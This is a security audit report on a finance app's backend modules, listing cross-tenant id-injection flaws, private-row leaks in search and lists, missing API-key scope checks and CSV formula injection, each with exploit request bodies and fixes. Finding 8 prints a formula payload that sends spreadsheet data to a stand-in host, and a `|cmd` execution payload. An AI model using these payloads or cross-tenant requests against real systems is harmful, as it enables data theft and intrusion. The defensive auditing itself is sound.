# Group 2 — statements, receipts, parsing, import, entity-imports, review-inbox, search

Commit audited: origin/main 43af3ca7 (detached worktree). All paths below are relative to `backend/src/`.

## Findings

| Sev | Conf | Module | file:line | Title |
|---|---|---|---|---|
| HIGH | CONFIRMED | receipts | `modules/receipts/receipts.service.ts:242-256, 373-381, 519-528, 1010-1016` | `PATCH /receipts/:id` `parsedData.categoryId` is an open record; the id is copied onto transactions without a workspace check (A→B category reference, foreign category name read back) |
| HIGH | CONFIRMED | receipts | `modules/receipts/receipts.service.ts:644-684, 985-1016` | `POST /receipts/bulk-approve` `categoryId` written onto the new transaction unvalidated |
| HIGH | CONFIRMED | statements | `modules/statements/statements.service.ts:296-302, 666-710` | `POST /statements/:id/convert-dropped-sample` takes `categoryId`/`branchId`/`walletId` from the body unvalidated; wallet looked up by id only and its `ownerMemberId` (another tenant's member) stored on the row |
| MEDIUM | CONFIRMED | search | `modules/search/search.service.ts:64-93` | `GET /search` returns merchant + purpose of other members' private rows |
| MEDIUM | CONFIRMED | receipts | `modules/receipts/receipts.service.ts:53-85` (controller `:287-308`) | `GET /receipts/:id/transaction-matches` lists candidates incl. private rows (counterpartyName, amount, date) with no redaction |
| MEDIUM | CONFIRMED | statements | `modules/statements/statements.service.ts:203-255` | Documents list `transactionSummary.description` is the first `paymentPurpose` of the statement's rows, private rows included |
| MEDIUM | CONFIRMED | entity-imports | `modules/entity-imports/entity-imports.controller.ts:20` | No `PermissionsGuard`: API-key scopes are not applied to `POST /entity-imports` and `DELETE /entity-imports/:batchId` |
| MEDIUM | LIKELY | statements, entity-imports | `statements.service.ts:288-293, 446-455`; `targets/transactions.target.ts:31, 177-192` | CSV files generated from user cells (manual expense, entity import) are stored verbatim and served as downloads: formula injection (`=`, `+`, `-`, `@`) |
| LOW | CONFIRMED | search | `modules/search/search.controller.ts:10` | Only `JwtAuthGuard + WorkspaceContextGuard` (no permission check / API-key scope); ILIKE `%`/`_` not escaped; no `@Throttle` |
| LOW | CONFIRMED | parsing | `modules/parsing/controllers/parsing.controller.ts:37-54` | `POST /documents/parse` is JWT-only (no workspace, fine) but runs OCR/xlsx on any upload without `@Throttle`; the file is not unlinked when `validateFile` throws |
| LOW | CONFIRMED | receipts | `modules/receipts/receipts.controller.ts:89-92, 123-124` | `validateFile` failures on `/receipts/upload` and `/receipts/scan` leave the multer file on disk (statements controller uses `unlinkAll`) |
| LOW | LIKELY | statements, receipts | `statements.controller.ts:342-361`; `receipts.controller.ts:354-367`; `common/services/file-storage.service.ts:114-115` | Uploaded XML (camt / e-invoice) is served `inline` with `application/xml`; an XSLT stylesheet reference cannot be satisfied cross-origin and HTML is not accepted, so no XSS found, but `attachment` would be safer |
| LOW | CONFIRMED | statements | `statements.controller.ts:375-377` | Thumbnail responses carry `Cache-Control: public, max-age=604800` on an authenticated, workspace-scoped image |
| LOW | CONFIRMED | receipts | `modules/receipts/services/receipt-split.service.ts:86-92` | `parsed_data || '<json>'::jsonb` built by string concatenation (single quotes escaped, values are the receipt's own lines) — works, but should be a bound parameter |

### 1. HIGH — receipts: `parsedData.categoryId` from the client is written onto transactions unchecked

Path: `PATCH /receipts/:id` (`@WorkspaceAuth(STATEMENT_EDIT)`) → `ReceiptsService.update()` → `receipt.parsedData = {...receipt.parsedData, ...edits}` (line 242-256; only `categorySource`/`categoryReason` are stripped) → `syncBookedTransaction()` → either `receiptTransactionFields()` (line 1013: `categoryId: receipt.parsedData?.categoryId`) when the row was booked by the receipt, or line 373-381 (`transactionRepository.update({id, workspaceId}, {categoryId: receipt.parsedData.categoryId})`). The same stored value reaches bank rows in `approveOnce()` line 519-528 and new rows in the `transactions.save(transactions.create(...buildTransaction(receipt)))` branch (line 579). `syncStatementCategory()` (line 295-299) is the only place that verifies the category belongs to the workspace, and it only guards the statement/scan-row update.

Contract: `UpdateReceiptBody.parsedData = Schema.Record(Schema.String, Schema.Unknown)` (`contracts/requests/receipts.ts:78`) — any key, any value.

Exploit: member of workspace A who knows a category id from workspace B (e.g. they are also a member of B, or an id seen in a shared link/export) sends `PATCH /receipts/<ownReceipt> {"parsedData":{"categoryId":"<B-category-id>"}}`. The receipt's scan transaction in A gets `category_id = B's category` (FK is a plain `categories(id)` reference, `transaction.entity.ts:177-182`). `GET /transactions/:id` in A loads `relations: ['category', ...]` (`transactions.service.ts:202`) and returns B's category name/colour/icon. Approving the receipt (`POST /receipts/:id/approve`) or attaching it to a bank row writes the same id. Budgets/reports in A then group by a category that is not in A.

Evidence:
```ts
// receipts.service.ts:373-381
} else if (receipt.parsedData?.categoryId && edits.categoryId !== undefined) {
  await this.transactionRepository.update(
    { id: target.id, workspaceId },
    { categoryId: receipt.parsedData.categoryId, ... },
  );
// receipts.service.ts:1010-1016
: { categoryId: receipt.parsedData?.categoryId || null, ... }
```
Fix: in `update()`, when `edits.categoryId` is set, resolve it with `categoryRepository.findOne({ where: { id, workspaceId } })` and reject (400) if missing; or reuse `TransactionsService.assertWorkspaceOwned` before every write of `parsedData.categoryId` onto a transaction.
Existing test: no (`cross-workspace-references.e2e-spec.ts` has no receipts case; `receipt-scan-approve.e2e-spec.ts` only exercises same-workspace ids).

### 2. HIGH — receipts: `bulk-approve.categoryId` unvalidated

Path: `POST /receipts/bulk-approve` → `bulkApprove(receiptIds, workspaceId, userId, categoryId)` → `buildTransactionFromReceipt(locked, workspaceId, currency, categoryId)` → `receiptTransactionFields(..., categoryId)` line 1010-1011: `{ categoryId, categorySource: MANUAL }` → `transactions.save(transactions.create(...))` (line 579) or `transactions.update(scanRow, …)` (line 553). `categoryId` is only checked to be a UUID.

Exploit: same actor as #1, `POST /receipts/bulk-approve {"receiptIds":[...],"categoryId":"<B-category-id>"}` → confirmed transactions in A referencing B's category, surfaced via the `category` relation on every transaction read.
Fix: `await this.categoryRepository.findOne({ where: { id: categoryId, workspaceId } })` at the top of `bulkApprove`, 400 if null.
Existing test: no.

### 3. HIGH — statements: `convert-dropped-sample` body ids unvalidated, wallet owner copied across tenants

Path: `POST /statements/:id/convert-dropped-sample` (`STATEMENT_EDIT`) → `convertDroppedSampleToTransaction()` → `transactionRepository.create({... categoryId: payload.transaction.categoryId, branchId: payload.transaction.branchId, walletId, ownerMemberId: await this.walletOwnerMemberId(walletId) })` → `save`. `walletOwnerMemberId` (line 296-302) does `walletRepository.findOne({ where: { id: walletId } })` with no workspace filter. Contract `ConvertDroppedSampleTransactionInput` (`contracts/requests/statements.ts:66-68`) types the three ids as plain strings (not even UUID).

Exploit: member of A with a statement that has any parsing warning (`payload.warning` may be supplied freely — line 636 accepts the body string, so no dropped sample is needed: `warning` truthy is enough) posts `{"index":0,"warning":"x","transaction":{"transactionDate":"2026-01-01","debit":1,"walletId":"<B-wallet>","categoryId":"<B-category>","branchId":"<B-branch>"}}`. Result: a transaction in A whose `wallet_id`, `category_id`, `branch_id` point into B and whose `owner_member_id` is B's wallet owner (a `workspace_members` row of B). `GET /transactions/:id` returns B's wallet/category/branch names. Because `ownerMemberId` is a B member, the row is "owned" by nobody in A (owner filters, privacy checks and `assertOwnerMemberInWorkspace` are bypassed for this row).

Evidence:
```ts
// statements.service.ts:296-302
private async walletOwnerMemberId(walletId: string): Promise<string | null> {
  const wallet = await this.walletRepository.findOne({ where: { id: walletId }, select: ['ownerMemberId'] });
// statements.service.ts:704-710
categoryId: payload.transaction.categoryId || ... ,
branchId: payload.transaction.branchId || ... ,
walletId,
ownerMemberId: walletId ? await this.walletOwnerMemberId(walletId) : null,
```
Fix: validate the three ids with `findOne({ where: { id, workspaceId } })` (or `TransactionsService.assertWorkspaceOwned`) before `create`, and add `workspaceId` to the wallet lookup; tighten the contract to `isUUID()`.
Existing test: no (`grep convert-dropped-sample @tests` → nothing).

### 4. MEDIUM — search: private rows returned

Path: `GET /search?q=` → `SearchService.searchTransactions()` — query filters `s.workspaceId`, `s.deletedAt IS NULL` and the needle; no `t.isPrivate = false`, no `redactPrivateRows`. Results carry `title: row.counterpartyName, subtitle: row.paymentPurpose`.
Exploit: any member of the workspace types a few letters of a merchant; private rows of other members (which `GET /statements/:id` redacts via `redactPrivateRows`, and which `statement-search.util.ts` explicitly excludes) come back with merchant and purpose. Enumeration with 2-letter needles (`MIN_QUERY_LENGTH = 2`, 5 hits per kind) reveals them gradually.
Fix: add `.andWhere('(t.isPrivate = false OR t.ownerMemberId = :selfMemberId)')` with `@WorkspaceMemberId()` passed from the controller, matching `statement-search.util.ts`.
Existing test: no search e2e exists.

### 5. MEDIUM — receipts: `transaction-matches` candidates include private rows

Path: `GET /receipts/:id/transaction-matches` (`STATEMENT_VIEW`) → `ReceiptMatchService.refresh()` → `candidates()` → `loadCandidates()` (`receipt-match.service.ts:53-85`): all non-duplicate rows of the workspace ±7 days; response maps `counterpartyName`, `amount`, `currency`, `transactionDate` per candidate. No `isPrivate` filter, no redaction. The stored suggestion (`metadata.transactionMatch.transactionIds`) can also point at a private row, and approving attaches the receipt (and copies the image onto that row, line 596-598).
Fix: in `loadCandidates` add `t.isPrivate = false` (or owner = viewer) ; redact in the controller mapping.
Existing test: `receipt-match.e2e-spec.ts` exists but has no private-row case.

### 6. MEDIUM — statements list leaks `paymentPurpose` of private rows

Path: `GET /statements` → `findAll()` → `loadTransactionSummaries()` (line 203-255): `ARRAY_AGG(NULLIF(transaction.paymentPurpose,''))[1]` grouped by statement, filtered by workspace only; the value is returned as `transactionSummary.description` for every statement. If the earliest row of a statement is another member's private row, its purpose is shown to everyone in the documents list.
Fix: `.andWhere('(transaction.isPrivate = false OR transaction.ownerMemberId = :selfMemberId)')` (pass the member id from the controller), as `buildStatementSearchClause` already does.
Existing test: no (`grep transactionSummary @tests` → nothing).

### 7. MEDIUM — entity-imports: API-key scopes not enforced

`EntityImportsController` uses `@UseGuards(JwtAuthGuard, WorkspaceContextGuard)` and never `PermissionsGuard`/`assertPermissions`. The service's `ensureCanEdit` (`canEditStatements`/`canEditDataEntry`) stops viewers/accountants and un-toggled members, so role authz is fine; but `missingScopes()` in `common/authz/request-permissions.ts` only runs through `PermissionsGuard`, so an API key issued with read-only scopes (e.g. `STATEMENT_VIEW`) whose owner is an admin can `POST /entity-imports` (create statements/transactions/payables/invoices/budgets/metal lots, plus categories) and `DELETE /entity-imports/:batchId` (hard-deletes everything in the batch). `search` has the same guard shape but is read-only (LOW).
Fix: `@WorkspaceAuth(Permission.STATEMENT_UPLOAD)` on the controller (or per-target permission in the service via `assertPermissions`).
Existing test: unit tests only; no e2e.

### 8. MEDIUM (LIKELY) — CSV formula injection in generated statement files

`createManualExpense` writes `merchant`/`description` through `escapeCsvValue` (quotes/commas/newlines only) and `TransactionsTarget.createStatement` writes every imported cell through `csvCell` (quotes only). The file is stored as the statement's `filePath`/`fileData` and served by `GET /statements/:id/file` (attachment) and in `export-zip`. A cell such as `=HYPERLINK("http://x/?"&A1)` or `-2+3|cmd` survives verbatim and executes when a colleague opens the download in Excel/LibreOffice.
Fix: prefix cells starting with `=`, `+`, `-`, `@`, `\t`, `\r` with `'` (or a space) in both writers.
Existing test: no.

### 9-14. LOW items

- **search guard/escaping**: `SearchController` has no permission check and `%`/`_` in `q` are passed to `LIKE` unescaped; no `@Throttle`. Read-only, so hardening only.
- **parsing `/documents/parse`**: JWT-only is acceptable (nothing is stored, no tenant data), but OCR on a 10 MB image per request with no throttle is a cheap CPU DoS; on `validateFile` failure the multer file is never unlinked (the `finally` is inside the try that starts after validation).
- **receipts upload orphan files**: `/receipts/upload` and `/receipts/scan` call `validateFile` without `unlinkAll` on failure.
- **inline XML**: `getMimeType` returns `application/xml` for camt files and `attachment.mimeType` (client-declared, allow-listed) for receipts; both are sent `inline`. XSLT needs a same-origin `href`, and that fetch would lack `X-Workspace-Id`, so I could not build an XSS; still, `attachment` for non-image/PDF types costs nothing.
- **thumbnail cache**: `Cache-Control: public` on `/statements/:id/thumbnail`.
- **receipt-split raw JSON concat**: `parsed_data || '${JSON.stringify(...).replace(/'/g, "''")}'::jsonb` — escaped, content is server-derived line items, but a parameter would remove the question.

## Verified clean (worth recording)

- **Uploads**: multer writes to the flat `uploads/` root with `randomUUID()` + extension derived from MIME (never from `originalname`); 10 MB limit; `validateFile` allow-lists MIME, checks magic bytes for binary types and requires a recognised statement format for text/XML/octet-stream; `readSignature`/`removeUploadedFile` re-check the path is under `uploads/`. The static mounts in `static-assets.util.ts` only expose `uploads/custom-field-icons`, `goal-covers`, `workspace-backgrounds`, `metal-photos` (uuid-named public images); statement/receipt files at the root are not reachable without the authenticated routes. No path from a client string to `fs` was found (`filePath` always comes from the DB; `resolveFilePath` candidates use `path.basename`).
- **Statement file/view/thumbnail/restore/trash/permanent delete/reprocess/commit/confirm-balance**: every entry goes through `findOne(id, workspaceId)` (query builder, so no undefined-widening) plus `ensureCanModify` (uploader or admin/owner, `canEditStatements`). `permanentDelete` deletes transactions by `statementId` of the verified statement. Thumbnail cache key is per statement id.
- **Duplicate detection**: statement hash check is `{ workspaceId, fileHash }` under an advisory lock keyed by workspace+hash; `ConflictException` exposes `duplicateStatementId` only for the same workspace. Receipt duplicate search is scoped by `userId` + `workspaceId`. `FileStorageService.getFileDataByHash` restores file bytes from another statement with the same hash **of the same user** (cross-workspace but same uploader and identical bytes — no new information).
- **Stage services** (statements/receipts): `find({ id: In(ids), workspaceId })`, guarded UPDATE with `workspace_id = :workspaceId`; non-admins may move only their own uploads.
- **Receipt approve/attach**: `attachTo` (`transactionId`) resolved with `{ id, workspaceId }`; the taken-check and scan-row lookups are scoped; row locked `pessimistic_write`. `markAsDuplicate` scoped. `receipt-split` validates reviewed `categoryId`s against workspace categories and goes through `TransactionsService.split`, which calls `assertWorkspaceOwned`.
- **Parsing queue/processor**: job payload is only `statementId` enqueued by the server; `StaleStatementReaper` iterates `STANDARD` workspaces. `ReceiptProcessorService` loads the receipt by job id (server-created job). No request context assumed.
- **Import sessions**: controller checks `session.workspaceId === workspaceId` before summary/cancel; the session id for commit is read from the statement's own `parsingDetails`; `resolutions` is index→action, no ids; `loadExisting` and fingerprint lookups scoped to `session.workspaceId`; new rows get `session.workspaceId`.
- **Entity-imports targets**: all lookups (`Transaction` fingerprints, `Payable`, `Invoice`, `Client`, `Budget`, `Subscription`, `BalanceAccount`) filtered by `ctx.workspaceId`; categories resolved by name within the workspace; `undo` loads the batch by `{ id, workspaceId }` and deletes with `workspaceId` in every `delete`. No ids are taken from rows. `mapping` keys are only read through `TARGET_FIELDS`.
- **Review-inbox**: all queries from `review-queue.queries.ts` start with `t.workspaceId = :workspaceId`; `redactPrivateRows` + `documentOf` hide private rows; reviewer filter is only `me`; `approveTransactions` goes through `TransactionsService.bulkUpdate → update` (validates `categoryId` with `assertWorkspaceOwned`, checks `canEditStatements`); `resolveDuplicate`/`approveStatement` scoped; scheduler iterates `STANDARD` workspaces and notifies through the member pipeline.
- **Statements search** (`statement-search.util.ts`) excludes `is_private` rows and binds all values.
- `UploadStatementBody.walletId/branchId` are accepted by `create()` but never used (dead parameters, not a hole).

## Per-module verdicts

- **statements**: 1 HIGH (`convert-dropped-sample` body ids + cross-tenant wallet owner), 1 MEDIUM (private `paymentPurpose` in list summary), 1 MEDIUM-LIKELY (CSV injection in manual-expense file), LOW (public thumbnail cache, inline XML). All 20 routes under `@WorkspaceAuth`; all other queries scoped.
- **receipts**: 2 HIGH (`parsedData.categoryId` and `bulk-approve.categoryId` unvalidated → cross-tenant category refs), 1 MEDIUM (private rows in `transaction-matches`), LOW (orphan files on failed validation, raw jsonb concat). All 17 routes under `@WorkspaceAuth`; file route checks ownership by workspace before `readFile`.
- **parsing**: clean apart from LOW (`/documents/parse` unthrottled OCR, orphan file). Queue/processor/reaper take no ids from clients.
- **import**: clean — all 4 routes under `@WorkspaceAuth`, session ownership checked, all writes with `session.workspaceId`.
- **entity-imports**: 1 MEDIUM (no `PermissionsGuard` → API-key scopes bypassed), 1 MEDIUM-LIKELY (CSV injection in generated statement). Data writes all scoped.
- **review-inbox**: clean — 6 routes under `@WorkspaceAuth`, private rows redacted, categoryId validated downstream, scheduler iterates workspaces correctly.
- **search**: 1 MEDIUM (private rows exposed), LOW (no permission/scope guard, unescaped LIKE, no throttle). Workspace scoping correct.

## Not checked / uncertainty

- `ClassificationService.classifyTransaction` / `suggestForPayee` (used by entity-imports categorize and receipt categorisation) were not read; receipts re-check the returned category against the workspace, entity-imports writes `result.categoryId` directly — out of my module set.
- `TransactionAttachmentsService.create` (receipt image copied onto the attached row) assumed scoped by its `workspaceId` argument; not read.
- `GeocodingService` outbound calls (receipt location/place suggestions) not reviewed for egress policy (out of scope list).
- The XSLT/inline-XML XSS was reasoned about, not reproduced in a browser.
- `StatementProcessingService` (1353 lines) was only grepped for id resolution (`classification.walletId/branchId` come from workspace rules), not fully read.
